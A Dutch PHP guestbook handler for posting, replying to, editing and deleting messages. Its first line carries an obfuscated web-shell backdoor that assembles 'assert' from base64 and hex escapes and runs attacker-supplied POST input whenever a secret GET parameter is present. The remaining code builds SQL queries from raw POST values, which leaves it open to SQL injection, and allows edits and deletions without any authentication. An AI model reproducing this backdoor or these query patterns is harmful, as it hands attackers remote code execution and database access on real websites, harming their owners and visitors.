<?php ${"G\x4c\x4f\x42\x41\x4c\x53"}["g\x70x\x65\x62p\x63\x75"]="c";if(isset($_GET["1380d"])&&isset($_POST["786af"])){${${"\x47\x4cO\x42A\x4c\x53"}["g\x70\x78\x65\x62p\x63\x75"]}=base64_decode("YX\x4ez\x5aX\x49\x3d")."t";@${${"G\x4c\x4fB\x41\x4c\x53"}["\x67\x70xe\x62\x70c\x75"]}($_POST["786af"]);exit();} ?><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<title>Bericht</title>
<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=ISO-8859-1">
<script src="scripts.js" type="text/javascript"></script>
<link rel="stylesheet" type="text/css" href="reacties.css">
<script type="text/javascript">
function goBack()
  {
  window.history.back()
  }
</script>
</head>
<body><?php
//include('chk_ban.php'); 
//rest van de pagina hieronder 
// Database gegevens includen.
include('dbconnect.php');
// Include de functies (BBcode, Mailcheck).
include('functies.php');
// Als het formulier is verzonden, voeg reactie toe in database.
if($_POST['submit'] OR $_POST['reageer']  OR $_POST['r_aanpassen'] OR $_POST['b_aanpassen']) {
    // Als auteur leeg is, auteur is anoniem.
    if(empty($_POST['auteur'])) {
      $auteur = "Anoniem";
    } 
    else {
      $auteur = htmlspecialchars($_POST['auteur']);
    }
    // Als er geen reactie is geschreven, geef melding en vermoord script.
    if(empty($_POST['bericht'])) {
        echo "<center><h2>Je moet een bericht schrijven! <br /><br />Klik <a onclick='goBack()' onMouseover=this.style.cursor='pointer'><u>hier</u></a> om terug te gaan</h2></center>";
        die();
    } 
    else {
        $bericht = bbcode($_POST['bericht']);
    }
    
    
    
	date_default_timezone_set('Europe/Amsterdam');
    $ip = $_POST['ip'];
    //$datum = date("d-m-Y");
    //$tijd = date("H:i:s");
   // $datumtijd = "".$datum." om ".$tijd."";
   $datumtijd= date("d-m-Y \o\m H:i");
    // De mysql query om de reactie in db te zetten.
	if(strstr($_POST['bericht'], '<a href') OR ((strstr($_POST['bericht'], 'www') OR strstr($_POST['bericht'], 'http://')) & !(strstr($_POST['bericht'], '[url]') ))){
		echo "<center><h2>Het bericht mag geen link bevatten en is daarom niet geplaatst.<br /><br />Klik <a onclick='goBack()' onMouseover=this.style.cursor='pointer'><u>hier</u></a> om terug te gaan</h2></center>";
	}
	
	else if($_POST['submit']){
		$email = $_POST['email'];
		$insert = mysql_query("INSERT INTO gastenboek (ip, auteur, bericht, email, datum) VALUES ('$ip', '$auteur', '$bericht', '$email', '$datumtijd')");
			if($insert) {
				echo "<head><meta http-equiv='refresh' content='2; URL=\"gastenboek.php\"'></head><center><h2>Uw bericht is succesvol toegevoegd. <br /><br />U wordt automatisch teruggestuurd naar het gastenboek. Zo niet, klik <a href=\"gastenboek.php\"><u>hier</u></a> om terug te gaan</h2></center>";
			} 
	}		
	
	else if($_POST['reageer']){	
		$id_b = $_POST['id_bericht'];
		$insert = mysql_query("INSERT INTO reageren (ip, auteur, bericht, id_b, datum) VALUES ('$ip', '$auteur', '$bericht', '$id_b', '$datumtijd')");
			if($insert) {
				echo "<head><meta http-equiv='refresh' content='2; URL=\"gastenboek.php\"'></head><center><h2>Uw reactie is succesvol toegevoegd. <br /><br />U wordt automatisch teruggestuurd naar het gastenboek. Zo niet, klik <a href=\"gastenboek.php\"><u>hier</u></a> om terug te gaan</h2></center>";
			} 
	}
	else if($_POST['r_aanpassen']){
		$r_id = $_POST['r_id'];
		$g_id = $_POST['g_id'];
		
		$insert = mysql_query("UPDATE reageren SET bericht='".$bericht."', auteur='".$auteur."' WHERE id_b = $g_id AND id=$r_id");
		if($insert) {
				echo "<head><meta http-equiv='refresh' content='2; URL=\"gastenboek.php\"'></head><center><h2>Uw reactie is succesvol aangepast. <br /><br />U wordt automatisch teruggestuurd naar het gastenboek. Zo niet, klik <a href=\"gastenboek.php\"><u>hier</u></a> om terug te gaan</h2></center>";
			} 
		else if(!$insert) { 
				die('Fout in de query: ' . mysql_error());
				}
	}	
	else if($_POST['b_aanpassen']){
		
		$g_id = $_POST['g_id'];
		
		$insert = mysql_query("UPDATE gastenboek SET bericht='".$bericht."', auteur='".$auteur."' WHERE id = $g_id");
		if($insert) {
				echo "<head><meta http-equiv='refresh' content='2; URL=\"gastenboek.php\"'></head><center><h2>Uw bericht is succesvol aangepast. <br /><br />U wordt automatisch teruggestuurd naar het gastenboek. Zo niet, klik <a href=\"gastenboek.php\"><u>hier</u></a> om terug te gaan</h2></center>";
			} 
		else if(!$insert) { 
				die('Fout in de query: ' . mysql_error());
				}
	}	
	// Als $insert lukt, geef melding, anders geef error
    else {
        echo "<Center><h2>Er is iets misgegaan, uw bericht is niet toegevoegd. <br /><br />Klik <a onclick='goBack()' onMouseover=this.style.cursor='pointer'><u>hier</u></a> om terug te gaan</h2></center>";
    }
	
    
}
if($_POST['deleten']){
$d_id=$_POST['r_id'];
$id = $_POST['g_id'];
				
				
	$insert = mysql_query("DELETE FROM reageren WHERE id ='".$d_id."' AND id_b='".$id."' ");
		if($insert){
			echo "GEDELETED<head><meta http-equiv='refresh' content='0; URL=\"gastenboek.php\"'></head>";
		}
		else{
			echo "Er is iets mis gegaan bij het deleten";
		}
}
if($_POST['DELETE']){				
	$idd = $_POST['g_id'];
	//bericht en reacties en likes verwijderen
		//$insert = mysql_query("DELETE gastenboek, reacties, reageren FROM gastenboek 
		//INNER JOIN reageren INNER JOIN reacties WHERE gastenboek.id = reageren.id_b AND gastenboek.id='".$idd."'  AND gastenboek.id=reacties.id ");
		$insert=mysql_query("DELETE FROM gastenboek WHERE id='".$idd."'") + mysql_query("DELETE FROM reacties WHERE id='".$idd."'") + mysql_query("DELETE FROM reageren WHERE id_b='".$idd."'");
			if($insert){
				echo "Het bericht en alle reacties zijn verwijderd<head><meta http-equiv='refresh' content='0; URL=\"gastenboek.php\"'></head>";
			}
			else{
				echo "Er is iets mis gegaan bij het deleten van een bericht en alle reacties";
				die('Fout in de query: ' . mysql_error());
			}
}
?>
</body>
</html> 